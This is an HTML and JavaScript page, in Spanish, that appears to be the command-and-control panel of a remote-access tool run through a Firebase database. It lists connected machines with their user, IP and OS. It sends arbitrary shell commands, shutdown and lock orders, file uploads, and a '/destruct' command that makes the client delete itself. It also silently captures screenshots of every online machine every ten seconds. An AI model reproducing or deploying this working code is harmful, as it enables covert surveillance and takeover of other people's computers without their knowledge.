<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>cmd</title>
  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Font Awesome para iconos -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
  <style>
    /* Estilos (sin cambios) */
    #console-output {
      scrollbar-width: thin;
      scrollbar-color: #4b5563 #1f2937;
    }
    #console-output::-webkit-scrollbar { width: 8px; }
    #console-output::-webkit-scrollbar-track { background: #1f2937; }
    #console-output::-webkit-scrollbar-thumb { background-color: #4b5563; border-radius: 4px; }
    .machine-grid-card {
        @apply bg-gray-800 rounded-lg shadow-lg flex flex-col justify-between p-4 transition-all h-[320px] relative overflow-hidden;
    }
    .machine-btn {
        @apply p-2 rounded-md bg-gray-700 hover:bg-gray-600 transition-colors focus:outline-none focus:ring-2 focus:ring-cyan-500 text-lg;
    }
    .modal-backdrop {
        @apply fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 transition-opacity p-4;
    }
    /* Estilo para la imagen de fondo de la screenshot en la tarjeta */
    .ss-preview {
        @apply w-full h-32 object-cover rounded mt-2 bg-black border border-gray-700;
    }
    [data-tooltip] { position: relative; cursor: pointer; }
    [data-tooltip]::after {
      content: attr(data-tooltip);
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%) translateY(-8px);
      background-color: #1f2937;
      color: #fff;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      white-space: nowrap;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.2s, visibility 0.2s;
      z-index: 100;
    }
    [data-tooltip]:hover::after { opacity: 1; visibility: visible; }
  </style>
</head>
<body class="bg-gray-900 text-gray-200 font-sans antialiased">

<!-- INICIO: Chuleta de Comandos -->
<div id="cheatsheet" class="hidden md:block fixed top-4 right-4 bg-gray-800 border border-gray-700 rounded-lg shadow-lg p-4 w-60 z-40">
    <h4 class="text-sm font-bold text-cyan-400 mb-3">Comandos Útiles</h4>
    <ul class="text-xs space-y-2 text-gray-300">
        <li class="truncate" title="/upload 'contenido' > 'nombre'"><code class="bg-gray-900 px-1 py-0.5 rounded text-white">/upload "..."</code> - <span class="text-gray-400">Subir</span></li>
        <li><code class="bg-gray-900 px-1 py-0.5 rounded text-white">/screenshot</code> - <span class="text-gray-400">Captura</span></li>
        <li><code class="bg-gray-900 px-1 py-0.5 rounded text-white">dir</code> - <span class="text-gray-400">Listar dir</span></li>
        <li><code class="bg-gray-900 px-1 py-0.5 rounded text-white">start ___</code> - <span class="text-gray-400">Abrir app/URL</span></li>
        <li class="truncate" title="https://logise1.neocities.org/popup">
            <a href="https://logise1.neocities.org/popup" target="_blank" class="hover:underline text-cyan-400">
                <code class="bg-gray-900 px-1 py-0.5 rounded text-cyan-400">start http...</code> - <span>Abrir Popup</span>
            </a>
        </li>
         <li><code class="bg-gray-900 px-1 py-0.5 rounded text-white">cls</code> - <span class="text-gray-400">Limpiar</span></li>
        <li><code class="bg-gray-900 px-1 py-0.5 rounded text-white">cd [ruta]</code> - <span class="text-gray-400">Navegar</span></li>
    </ul>
</div>
<!-- FIN: Chuleta de Comandos -->


  <div class="container mx-auto p-4 max-w-7xl md:pr-[17rem]">
    <header class="flex justify-between items-center mb-6">
      <h1 class="text-2xl font-bold text-white">(:</h1>
      <div class="text-right">
          <div id="status" class="text-sm font-medium">Conectando...</div>
          <div id="auto-ss-status" class="text-xs text-cyan-500 animate-pulse" style="display:none;">Auto-Screenshot: ON</div>
      </div>
    </header>

    <main>
      <!-- Cuadrícula de Máquinas -->
      <div id="machines-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
        <p class="text-gray-400 col-span-full">Esperando máquinas...</p>
      </div>

      <!-- Panel de Consola (oculto por defecto) -->
      <div id="panel" class="mt-8 bg-gray-800 rounded-lg shadow-lg" style="display: none;">
        <div class="p-4 border-b border-gray-700 flex justify-between items-center">
          <h2 class="text-lg font-semibold">Consola: <span id="selName" class="font-mono text-cyan-400"></span></h2>
          <button id="closePanelBtn" class="machine-btn text-sm px-3 py-1">Volver a la cuadrícula</button>
        </div>
        
        <div id="console-output" class="h-96 p-4 bg-gray-900 font-mono text-sm overflow-y-auto">
          <!-- Las respuestas aparecerán aquí -->
        </div>
        
        <form id="cmd-form" class="flex border-t border-gray-700 bg-gray-900 rounded-b-lg">
          <span id="console-input" class="flex-shrink-0 p-3 text-gray-400 whitespace-pre font-mono">...&gt;</span>
          <input id="cmdInput" type="text" placeholder="Escribe tu comando..." autocomplete="off" 
                   class="flex-grow p-3 bg-transparent text-white focus:outline-none placeholder-gray-500 font-mono"/>
          
          <button id="ssBtn" type="button" title="Capturar Pantalla ( /screenshot )"
                   class="bg-cyan-700 text-white px-4 py-3 hover:bg-cyan-600 focus:outline-none transition-colors">
            <i class="fa-solid fa-camera"></i>
          </button>

          <button id="sendBtn" type="submit" 
                   class="bg-cyan-600 text-white px-4 py-3 rounded-br-lg hover:bg-cyan-500 focus:outline-none transition-colors">
            Enviar
          </button>
        </form>
      </div>
    </main>
  </div>

  <!-- Template modificado para incluir imagen -->
  <template id="machineTpl">
    <div class="machine-grid-card">
      <div class="relative z-10">
        <div class="flex justify-between items-start">
          <div class="cursor-pointer group" title="Abrir consola">
            <strong class="name font-mono text-lg group-hover:text-cyan-400 break-all"></strong>
          </div>
          <span class="state-dot w-3 h-3 rounded-full flex-shrink-0 mt-2" title="Offline"></span>
        </div>
        <div class="text-xs mt-1 text-gray-400"><span class="lastSeen"></span></div>
        
        <!-- Contenedor para la Screenshot en el Grid -->
        <div class="ss-container hidden">
             <img src="" alt="Live Preview" class="ss-preview" />
        </div>
      </div>

      <div class="text-xs text-gray-400 space-y-1 my-3 relative z-10 info-container">
        <div class="truncate" data-tooltip="Usuario"><i class="fa-solid fa-user w-4 text-center mr-1"></i><span class="sys-user">...</span></div>
        <div class="truncate" data-tooltip="Dirección IP"><i class="fa-solid fa-network-wired w-4 text-center mr-1"></i><span class="sys-ip">...</span></div>
        <div class="truncate" data-tooltip="Sistema Operativo"><i class="fa-solid fa-laptop w-4 text-center mr-1"></i><span class="sys-os">...</span></div>
        <div class="truncate" data-tooltip="Directorio Inicial"><i class="fa-solid fa-folder w-4 text-center mr-1"></i><span class="sys-cwd">...</span></div>
      </div>

      <div class="relative z-10">
        <!-- Controles de Bloqueado -->
        <div class="locked-controls text-center" style="display: none;">
          <i class="fa-solid fa-lock text-7xl text-red-500 mx-auto"></i>
          <span class="block text-red-500 font-bold text-lg mt-2">BLOQUEADO</span>
          <button class="unlock-btn machine-btn bg-green-700 hover:bg-green-600 text-white w-full mt-4 flex items-center justify-center gap-2" title="Desbloquear">
            <i class="fa-solid fa-lock-open"></i> Desbloquear
          </button>
        </div>
        
        <!-- Controles Estándar (Apagar/Reiniciar) -->
        <div class="standard-controls flex justify-around items-center gap-2" style="display: none;">
          <button class="shutdown-btn machine-btn text-red-500" title="Apagar"><i class="fa-solid fa-power-off"></i></button>
          <button class="restart-btn machine-btn text-yellow-500" title="Reiniciar"><i class="fa-solid fa-rotate-right"></i></button>
        </div>
        
        <!-- Contenedor del Botón de Bloqueo (Visible con ?lock) -->
        <div class="lock-btn-wrapper mt-2" style="display: none;">
           <button class="lock-btn machine-btn text-red-700 w-full flex items-center justify-center gap-2" title="Bloquear">
             <i class="fa-solid fa-lock"></i> Bloquear
           </button>
        </div>
      </div>
    </div>
  </template>

  <!-- Modales (Sin cambios) -->
  <div id="confirm-modal" class="hidden opacity-0 modal-backdrop">
    <div class="bg-gray-800 rounded-lg shadow-xl w-full max-w-sm p-6">
      <h3 id="confirm-title" class="text-xl font-bold text-white mb-2"></h3>
      <p id="confirm-message" class="text-gray-300 mb-6"></p>
      <div id="confirm-input-wrap" class="mb-4" style="display: none;">
        <label for="confirm-input" class="text-sm text-gray-400">Escribe <strong id="confirm-match"></strong> para confirmar:</label>
        <input id="confirm-input" type="text" class="w-full p-2 bg-gray-900 text-white rounded mt-1 outline-none focus:ring-2 focus:ring-cyan-500">
      </div>
      <div class="flex justify-end gap-3">
        <button id="confirm-btn-no" class="px-4 py-2 rounded bg-gray-600 hover:bg-gray-500 text-white">Cancelar</button>
        <button id="confirm-btn-yes" class="px-4 py-2 rounded bg-red-600 hover:bg-red-500 text-white">Confirmar</button>
      </div>
    </div>
  </div>
  <div id="screenshot-modal" class="hidden opacity-0 modal-backdrop">
    <div class="bg-gray-800 rounded-lg shadow-xl w-full max-w-6xl p-4 relative">
      <div class="flex justify-between items-center mb-3">
        <h3 id="screenshot-title" class="text-xl font-bold text-white">Captura de Pantalla</h3>
        <button id="screenshot-close-btn" class="text-gray-300 hover:text-white text-3xl leading-none">&times;</button>
      </div>
      <div class="bg-gray-900 p-2 rounded overflow-auto" style="max-height: 80vh;">
        <img id="screenshot-image" src="" alt="Screenshot" class="w-full h-auto object-contain"/>
      </div>
    </div>
  </div>

  <!-- SDK de Firebase -->
  <script type="module">
    // Importa las funciones que necesitas
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue, set, remove, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    // --- Configuración de Firebase ---
    const firebaseConfig = {
      databaseURL: "https://cmdapp-e276d-default-rtdb.europe-west1.firebasedatabase.app",
    };
    // ---------------------------------
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    let machines = {};
    let lockedMachines = {};
    let selected = null;
    let globalResponseListener = null;
    let globalScreenshotListener = null;
    let lastScreenshotId = null;
    let currentCWD = "..."; 
    let timeOffset = 0; // Variable para almacenar la diferencia horaria con el servidor

    // Comprobar el parámetro URL ?lock
    const urlParams = new URLSearchParams(window.location.search);
    const hasLockParam = urlParams.has('lock');

    // Referencias a elementos del DOM
    const statusEl = document.getElementById('status');
    const autoSsStatusEl = document.getElementById('auto-ss-status');
    const machinesGridEl = document.getElementById('machines-grid');
    const panelEl = document.getElementById('panel');
    const selNameEl = document.getElementById('selName');
    const consoleOutputEl = document.getElementById('console-output');
    const cmdInputEl = document.getElementById('cmdInput');
    const cmdFormEl = document.getElementById('cmd-form');
    const machineTpl = document.getElementById('machineTpl');
    const closePanelBtn = document.getElementById('closePanelBtn');
    const ssBtn = document.getElementById('ssBtn');
    const consoleInputSpan = document.getElementById('console-input');
    const confirmModal = document.getElementById('confirm-modal');
    const confirmTitle = document.getElementById('confirm-title');
    const confirmMessage = document.getElementById('confirm-message');
    const confirmBtnNo = document.getElementById('confirm-btn-no');
    const confirmBtnYes = document.getElementById('confirm-btn-yes');
    const confirmInputWrap = document.getElementById('confirm-input-wrap');
    const confirmInput = document.getElementById('confirm-input');
    const confirmMatch = document.getElementById('confirm-match');
    const screenshotModal = document.getElementById('screenshot-modal');
    const screenshotTitle = document.getElementById('screenshot-title');
    const screenshotImage = document.getElementById('screenshot-image');
    const screenshotCloseBtn = document.getElementById('screenshot-close-btn');

    let onConfirmCallback = null;

    // --- DECODIFICACIÓN ---
    function atob_utf8(b64) {
      if (typeof b64 !== 'string') return b64;
      try {
        const binStr = atob(b64);
        const utf8Bytes = new Uint8Array(binStr.length);
        for (let i = 0; i < binStr.length; i++) {
          utf8Bytes[i] = binStr.charCodeAt(i);
        }
        const decoder = new TextDecoder('windows-1252'); 
        return decoder.decode(utf8Bytes);
      } catch (e) {
        return b64; 
       }
    }

    // --- FUNCIONES DE TIEMPO CON API ---
    // Función para obtener el offset de tiempo con el servidor
    async function initTimeOffset() {
      try {
        const response = await fetch("https://timeapi.bio/timeapi/time", {
          method: "POST",
          headers: {
            "Accept": "*/*",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            "region": "Europe/Madrid",
            "format": "json"
          })
        });
        
        if (!response.ok) {
          throw new Error(`API error: ${response.status}`);
        }
        
        const timeData = await response.json();
        const serverTime = Math.floor(new Date(timeData.time).getTime() / 1000);
        const localTime = Math.floor(Date.now() / 1000);
        timeOffset = serverTime - localTime;
        
        console.log("Offset de tiempo calculado:", timeOffset, "segundos");
        return timeOffset;
      } catch (error) {
        console.warn("Error usando API de tiempo, usando offset por defecto (-2 horas):", error);
        timeOffset = -7200; // -2 horas en segundos (fallback)
        return timeOffset;
      }
    }

    // Función para ajustar timestamps usando el offset del servidor
    function adjustTimestamp(timestamp) {
      return timestamp + timeOffset;
    }

    // Función para verificar si una máquina está online usando tiempo del servidor
    function isMachineOnlineWithOffset(lastSeenTimestamp) {
      const serverTime = Math.floor(Date.now() / 1000) + timeOffset;
      return (serverTime - lastSeenTimestamp) < 30; // 30 segundos de tolerancia
    }

    // Obtener el tiempo del servidor actual
    function getServerTime() {
      return Math.floor(Date.now() / 1000) + timeOffset;
    }
    
    // --- Funciones de Modales ---
    function showConfirm(title, message, onConfirm, matchText = null) {
      confirmTitle.textContent = title;
      confirmMessage.textContent = message;
      onConfirmCallback = onConfirm;
      confirmInput.value = "";
      if (matchText) {
        confirmInputWrap.style.display = 'block';
        confirmMatch.textContent = matchText;
        confirmBtnYes.disabled = true;
        confirmBtnYes.classList.add('opacity-50', 'cursor-not-allowed');
      } else {
        confirmInputWrap.style.display = 'none';
        confirmBtnYes.disabled = false;
        confirmBtnYes.classList.remove('opacity-50', 'cursor-not-allowed');
      }
      confirmModal.style.display = 'flex';
      requestAnimationFrame(() => confirmModal.classList.remove('opacity-0'));
    }

    function hideConfirm() {
      confirmModal.classList.add('opacity-0');
      setTimeout(() => confirmModal.style.display = 'none', 200);
      onConfirmCallback = null;
    }

    function showScreenshot(name, b64data, timestamp) {
      const adjustedTimestamp = adjustTimestamp(timestamp);
      const ssDate = new Date(adjustedTimestamp * 1000).toLocaleString();
      screenshotTitle.textContent = `Captura de ${name} (${ssDate})`;
      screenshotImage.src = "data:image/png;base64," + b64data; 
      screenshotModal.style.display = 'flex';
      requestAnimationFrame(() => screenshotModal.classList.remove('opacity-0'));
    }

    function hideScreenshot() {
      screenshotModal.classList.add('opacity-0');
      setTimeout(() => { 
       screenshotModal.style.display = 'none'; 
       screenshotImage.src = "";
      }, 200);
    }

    confirmBtnNo.onclick = hideConfirm;
    confirmBtnYes.onclick = () => {
      if (onConfirmCallback) onConfirmCallback();
      hideConfirm();
    };

    confirmInput.oninput = () => {
      const matchText = confirmMatch.textContent;
      if (confirmInput.value === matchText) {
        confirmBtnYes.disabled = false;
        confirmBtnYes.classList.remove('opacity-50', 'cursor-not-allowed');
      } else {
        confirmBtnYes.disabled = true;
        confirmBtnYes.classList.add('opacity-50', 'cursor-not-allowed');
      }
    };

    function encodeKey(s) {
      return s.replace(/[.\$\[\]#\/ ]/g, "_");
    }

    function updateConsolePrompt() {
        if (!currentCWD || currentCWD === "...") {
            consoleInputSpan.textContent = "...>";
        } else {
            const cleanCWD = currentCWD.replace(/\\+/g, '\\');
            consoleInputSpan.textContent = `${cleanCWD}>`;
        }
    }

    function addToConsole(text, type = 'response') {
        const line = document.createElement('div');
        if (type === 'user') {
            line.className = 'text-white';
            line.textContent = `${consoleInputSpan.textContent} ${text}`;
        } else if (type === 'info') {
            line.className = 'text-cyan-400';
            line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
        } else if (type === 'error') {
            line.className = 'text-red-400';
            line.textContent = text;
        } else {
            if (text.trim() === "") return; 
            line.className = 'text-gray-300 whitespace-pre-wrap';
            line.textContent = text;
        }
        consoleOutputEl.appendChild(line);
        consoleOutputEl.scrollTop = consoleOutputEl.scrollHeight;
    }

    /**
     * Renderiza la cuadrícula de máquinas y muestra Screenshot si existe
     */
    function renderMachines() {
      machinesGridEl.innerHTML = "";
      const allMachineNames = new Set([...Object.keys(machines), ...Object.keys(lockedMachines)]);
      const sortedNames = Array.from(allMachineNames).sort();

      if (sortedNames.length === 0) {
        machinesGridEl.innerHTML = "<p class='text-gray-400 col-span-full'>No hay máquinas reportando...</p>";
        return;
      }

      sortedNames.forEach(name => {
        const node = machines[name] || {};
        const isLocked = !!lockedMachines[name];
        const status = node.status || {};
        const info = node.info || { os: '...', user: '...', ip: '...', cwd: '...' };
        const screenshotData = node.screenshot || null;

        const os = info.os ? atob_utf8(info.os) : '...';
        const user = info.user ? atob_utf8(info.user) : '...'; 
        const ip = info.ip ? atob_utf8(info.ip) : '...';
        const cwd = info.cwd ? atob_utf8(info.cwd).replace(/\\+/g, '\\') : '...';
        
        const lastSeenTimestamp = status.lastSeen ? adjustTimestamp(status.lastSeen) : null;
        const lastSeen = lastSeenTimestamp ? new Date(lastSeenTimestamp * 1000) : null;
        
        const el = machineTpl.content.cloneNode(true);
        const cardDiv = el.querySelector('.machine-grid-card');
        
        const nameEl = el.querySelector('.name');
        nameEl.textContent = name;
        nameEl.onclick = () => selectMachine(name);

        el.querySelector('.sys-os').textContent = os;
        el.querySelector('.sys-user').textContent = user;
        el.querySelector('.sys-ip').textContent = ip;
        el.querySelector('.sys-cwd').textContent = cwd;
        el.querySelector('.sys-os').parentElement.dataset.tooltip = os;
        el.querySelector('.sys-user').parentElement.dataset.tooltip = user;
        el.querySelector('.sys-ip').parentElement.dataset.tooltip = ip;
        el.querySelector('.sys-cwd').parentElement.dataset.tooltip = cwd;

        // --- MANEJO DE SCREENSHOT EN GRID ---
        const ssContainer = el.querySelector('.ss-container');
        const ssImg = el.querySelector('.ss-preview');
        
        if (screenshotData && screenshotData.data) {
            ssContainer.classList.remove('hidden');
            ssImg.src = "data:image/png;base64," + screenshotData.data;
            el.querySelector('.info-container').style.display = 'none'; 
        }

        const stDot = el.querySelector('.state-dot');
        const standardControls = el.querySelector('.standard-controls');
        const lockedControls = el.querySelector('.locked-controls');
        const lockBtnWrapper = el.querySelector('.lock-btn-wrapper');

        if (isLocked) {
          // --- MÁQUINA BLOQUEADA ---
          stDot.className = 'state-dot w-3 h-3 rounded-full flex-shrink-0 bg-red-700';
          stDot.title = 'Bloqueado';
          el.querySelector('.lastSeen').textContent = 'Bloqueado';
          standardControls.style.display = 'none';
          lockedControls.style.display = 'block';
          lockBtnWrapper.style.display = 'none'; 
          el.querySelector('.unlock-btn').onclick = () => sendUnlock(name);
          cardDiv.classList.add('border-2', 'border-red-700');
          el.querySelector('.sys-os').textContent = 'Bloqueado';

        } else if (lastSeenTimestamp && isMachineOnlineWithOffset(lastSeenTimestamp)) {
          // --- MÁQUINA ONLINE (verificado con tiempo del servidor) ---
          stDot.className = 'state-dot w-3 h-3 rounded-full flex-shrink-0 bg-green-500';
          stDot.title = 'Online';
          el.querySelector('.lastSeen').textContent = `Visto: ${lastSeen.toLocaleString()}`;
          lockedControls.style.display = 'none';
          
          standardControls.style.display = 'flex';

          if (hasLockParam) {
              lockBtnWrapper.style.display = 'block';
              el.querySelector('.lock-btn').onclick = () => sendLock(name);
          } else {
              lockBtnWrapper.style.display = 'none';
          }

          el.querySelector('.shutdown-btn').onclick = () => sendQuickCommand(name, 'shutdown /s /t 0', 'Apagar');
          el.querySelector('.restart-btn').onclick = () => sendQuickCommand(name, 'shutdown /r /t 0', 'Reiniciar');

        } else {
          // --- MÁQUINA OFFLINE ---
          stDot.className = 'state-dot w-3 h-3 rounded-full flex-shrink-0 bg-gray-600';
          stDot.title = 'Offline';
          el.querySelector('.lastSeen').textContent = lastSeen ? `Visto: ${lastSeen.toLocaleString()}` : "Nunca visto";
          standardControls.style.display = 'none';
          lockedControls.style.display = 'none';
          lockBtnWrapper.style.display = 'none';
        }
        
        if (name === selected) {
          cardDiv.classList.add('ring-2', 'ring-cyan-500');
        }
        
        machinesGridEl.appendChild(el);
      });
    }

    // --- Lógica de Selección y Consola ---
    function selectMachine(name) {
      if (lockedMachines[name]) {
          showConfirm("Máquina Bloqueada", `La máquina ${name} está bloqueada. Desbloquéala primero para poder interactuar con ella.`, () => {}, null);
          return;
      }
      const machineNode = machines[name];
      if (!machineNode) {
          showConfirm("Máquina Offline", `La máquina ${name} no está reportando. No se puede conectar.`, () => {}, null);
          return;
      }
      const status = machineNode.status || {};
      const lastSeenTimestamp = status.lastSeen ? adjustTimestamp(status.lastSeen) : null;
      
      if (!lastSeenTimestamp || !isMachineOnlineWithOffset(lastSeenTimestamp)) {
          const lastSeen = lastSeenTimestamp ? new Date(lastSeenTimestamp * 1000).toLocaleString() : 'Nunca';
          showConfirm("Máquina Offline", `La máquina ${name} parece estar offline. (Última vez vista: ${lastSeen}). No se puede conectar.`, () => {}, null);
          return;
      }

      selected = name;
      panelEl.style.display = "block";
      machinesGridEl.style.display = "none";
      autoSsStatusEl.style.display = "none";
      selNameEl.textContent = name;
      consoleOutputEl.innerHTML = ""; 

      const info = machineNode.info || {};
      let initialCwd = info.cwd ? atob_utf8(info.cwd) : 'C:\\';
      currentCWD = initialCwd.replace(/\\+/g, '\\'); 
      updateConsolePrompt();
      addToConsole(`Conectado a ${name}.`, 'info');

      if (globalResponseListener) globalResponseListener();
      if (globalScreenshotListener) globalScreenshotListener();

      const responseRef = ref(db, `machines/${encodeKey(name)}/lastResponse`);
      globalResponseListener = onValue(responseRef, (snapshot) => {
        const data = snapshot.val();
        if (data && data.hasOwnProperty('response')) {
            const plainResponse = atob_utf8(data.response);
            
            let isAudioResponse = false;
            try {
              const jsonString = plainResponse.replace(/'/g, '"');
              const parsed = JSON.parse(jsonString);

              if (parsed && parsed.URL && parsed.Text) {
                isAudioResponse = true;
                const speaker = parsed.Speaker || 'Voz';
                addToConsole(`[Audio de ${speaker}]: ${parsed.Text}`, 'info'); 
                const audio = new Audio(parsed.URL);
                audio.play().catch(e => {
                  console.error("Error al reproducir audio:", e);
                  addToConsole(`Error: No se pudo auto-reproducir el audio (click del usuario requerido?). ${e.message}`, 'error');
                });
              }
            } catch (e) {
              // No es un JSON
            }

            if (!isAudioResponse) {
              addToConsole(plainResponse, 'response');
            }
        }
      }, (error) => {
        addToConsole(`Error escuchando respuestas: ${error.message}`, 'error');
      });

      const screenshotRef = ref(db, `machines/${encodeKey(name)}/screenshot`);
      globalScreenshotListener = onValue(screenshotRef, (snapshot) => {
        const data = snapshot.val();
        if (data && data.data && data.id !== lastScreenshotId) {
          lastScreenshotId = data.id;
          showScreenshot(name, data.data, data.timestamp);
        }
      }, (error) => {
        addToConsole(`Error escuchando screenshots: ${error.message}`, 'error');
      });

      panelEl.scrollIntoView({ behavior: 'smooth' });
      cmdInputEl.focus();
    }

    function closePanel() {
        if (globalResponseListener) globalResponseListener();
        if (globalScreenshotListener) globalScreenshotListener();
        globalResponseListener = null;
        globalScreenshotListener = null;
        selected = null;
        panelEl.style.display = "none";
        machinesGridEl.style.display = "grid";
        autoSsStatusEl.style.display = "block";
        currentCWD = "...";
        updateConsolePrompt();
        renderMachines();
    }

    // --- Lógica de Comandos ---
    async function sendFirebaseCommand(name, cmd, cwd, clearAfter6s = true) {
        const id = "cmd-" + Date.now();
        const payload = { id: id, cmd: cmd, cwd: cwd };
        const cmdRef = ref(db, `machines/${encodeKey(name)}/command`);

        try {
            await set(cmdRef, payload);
            
            if (clearAfter6s) {
                setTimeout(async () => {
                    try {
                        const snapshot = await get(cmdRef);
                        if (snapshot.exists() && snapshot.val().id === id) {
                            await remove(cmdRef);
                        }
                    } catch (e) {
                        console.error(`Error al borrar comando (${cmd}) para ${name}:`, e);
                    }
                }, 6000);
            }
        } catch (e) {
            console.error(`Error al enviar comando: ${e.message}`);
            throw e; 
        }
    }

    async function sendQuickCommand(name, cmd, actionName = 'Comando') {
      if (!machines[name]) {
        return showConfirm("Error", 'La máquina está offline.', () => {});
      }
      
      showConfirm(`Confirmar ${actionName}`, `¿Estás seguro de que quieres enviar el comando "${cmd}" a ${name}?`, async () => {
        try {
          await sendFirebaseCommand(name, cmd, "C:\\", true);
        } catch (e) {
          showConfirm("Error de Firebase", `Error al enviar comando: ${e.message}`, () => {});
        }
      });
    }

    // --- Lógica de comandos locales ---
    function resolvePath(cwd, newPath) {
        cwd = cwd.replace(/\\+/g, '\\');
        newPath = newPath.replace(/\//g, '\\').replace(/\\+/g, '\\');
        if (newPath === '\\') {
            return cwd.substring(0, cwd.indexOf('\\') + 1) || cwd;
        }
        if (newPath.startsWith('\\')) {
            return cwd.substring(0, cwd.indexOf('\\') + 1) + newPath.substring(1);
        }
        if (newPath.includes(':')) {
            if (newPath.length === 2) return newPath + '\\';
            return newPath;
        }
        let parts = cwd.split('\\');
        const newParts = newPath.split('\\');
        for (const part of newParts) {
            if (part === '..') {
                if (parts.length > 1) { 
                    parts.pop();
                }
            } else if (part !== '.' && part !== '') {
                parts.push(part);
            }
        }
        let result = parts.join('\\');
        if (result.length === 2 && result.endsWith(':')) {
            result += '\\';
        }
        return result;
    }

    function handleLocalCommand(cmd) {
        addToConsole(cmd, 'user'); 
        const cmdLower = cmd.toLowerCase().trim();
        if (cmdLower === 'cls') {
            consoleOutputEl.innerHTML = "";
            return;
        }
        let newPath = "";
        if (cmdLower === 'cd..' || cmdLower === 'cd ..') {
            newPath = resolvePath(currentCWD, '..');
        } else if ((cmdLower.length === 2 && cmdLower.endsWith(':')) || (cmdLower.length === 5 && cmdLower.startsWith('cd ') && cmdLower.endsWith(':'))) {
            let drive = cmdLower.replace('cd ', '')
            newPath = resolvePath(currentCWD, drive);
        } else if (cmdLower.startsWith('cd ')) {
            newPath = resolvePath(currentCWD, cmd.substring(3));
        }
        if (newPath) {
            currentCWD = newPath;
            updateConsolePrompt();
        }
    }

    async function sendConsoleCommand(cmd) {
      if (!selected) return addToConsole("Error: No hay ninguna máquina seleccionada.", 'error');

      const cmdTrim = cmd.trim();
      const cmdLower = cmdTrim.toLowerCase();

      if (cmdLower === 'cls' || cmdLower.startsWith('cd ') || cmdLower === 'cd..' || (cmdLower.length === 2 && cmdLower.endsWith(':'))) {
          handleLocalCommand(cmdTrim);
          return;
      }

      if (cmdLower === '/destruct') {
          showConfirm("¡Autodestrucción!",
            `Estás a punto de autodestruir el cliente en ${selected}.\nEl script se borrará a sí mismo de la máquina. Esta acción es irreversible.`,
            async () => {
              await sendCommandInternal(cmdTrim);
              addToConsole("Comando /destruct enviado.", 'info');
            },
            "DESTRUIR"
          );
          return;
      }
      
      if (cmdLower === '/screenshot') {
          addToConsole("Solicitando captura de pantalla...", 'info');
      }

      await sendCommandInternal(cmdTrim);
    }

    async function sendCommandInternal(cmd) {
        try {
          await sendFirebaseCommand(selected, cmd, currentCWD, true);
          
          if (cmd.toLowerCase() !== '/screenshot') {
            addToConsole(cmd, 'user');
          }
        } catch (e) {
          addToConsole(`Error al enviar comando: ${e.message}`, 'error');
        }
    }

    async function sendLock(name) {
        showConfirm("Confirmar Bloqueo",
          `¿Estás seguro de que quieres BLOQUEAR y APAGAR ${name}?\nLa máquina no podrá volver a conectarse hasta que la desbloquees manually desde aquí.`,
          async () => {
            try {
              const lockRef = ref(db, `lock/${encodeKey(name)}`);
              await set(lockRef, "locked");
              await sendFirebaseCommand(name, "/lock", "C:\\", true);
            } catch (e) {
              console.error(`Error al bloquear: ${e.message}`);
              showConfirm("Error de Firebase", `Error al bloquear: ${e.message}`, () => {});
            }
          }
        );
    }

    async function sendUnlock(name) {
        showConfirm("Confirmar Desbloqueo",
          `¿Estás seguro de que quieres DESBLOQUEAR ${name}?\nEsto permitirá que el script se ejecute la próxima vez que la máquina se inicie manually.`,
          async () => {
            try {
              const lockRef = ref(db, `lock/${encodeKey(name)}`);
              await remove(lockRef);
            } catch (e) {
              console.error(`Error al desbloquear: ${e.message}`);
              showConfirm("Error de Firebase", `Error al desbloquear: ${e.message}`, () => {});
            }
          }
        );
    }

    // --- Bucle automático de Screenshot (usando tiempo del servidor) ---
    function startAutoScreenshotLoop() {
        setInterval(() => {
            if (!selected) {
                const serverNow = getServerTime();
                
                Object.keys(machines).forEach(name => {
                    const node = machines[name];
                    const status = node.status || {};
                    
                    if (status.lastSeen) {
                        const lastSeen = adjustTimestamp(status.lastSeen);
                        // Verificar online usando tiempo del servidor
                        if ((serverNow - lastSeen) < 30) {
                            sendFirebaseCommand(name, "/screenshot", "C:\\", true)
                                .catch(err => console.error("Auto-ss error:", err));
                        }
                    }
                });
            }
        }, 10000); // 10 segundos
    }

    // --- Inicialización y Listeners ---
    function listenToFirebase() {
      statusEl.textContent = "Conectado a Firebase.";
      statusEl.classList.add('text-green-400');
      autoSsStatusEl.style.display = "block";

      onValue(ref(db, 'machines'), (snapshot) => {
        machines = snapshot.val() || {};
        renderMachines();
      }, (error) => {
        statusEl.textContent = `Error (machines): ${error.message}`;
        statusEl.classList.add('text-red-400');
      });

      onValue(ref(db, 'lock'), (snapshot) => {
        lockedMachines = snapshot.val() || {};
        renderMachines();
      }, (error) => {
        statusEl.textContent = `Error (lock): ${error.message}`;
        statusEl.classList.add('text-red-400');
      });
    }
    
    cmdFormEl.onsubmit = (e) => {
        e.preventDefault();
        const cmd = cmdInputEl.value.trim();
        if (cmd) {
            sendConsoleCommand(cmd);
            cmdInputEl.value = "";
        }
    };
    
    ssBtn.onclick = () => {
      if (selected) {
        sendConsoleCommand("/screenshot"); 
       }
    };
    
    closePanelBtn.onclick = closePanel;
    screenshotCloseBtn.onclick = hideScreenshot; 

    // Inicializar todo
    listenToFirebase();
    
    // Inicializar el offset de tiempo y luego iniciar el bucle
    initTimeOffset().then(() => {
      startAutoScreenshotLoop();
      console.log("Sistema inicializado con offset de tiempo:", timeOffset, "segundos");
    });

  </script>
</body>
</html>
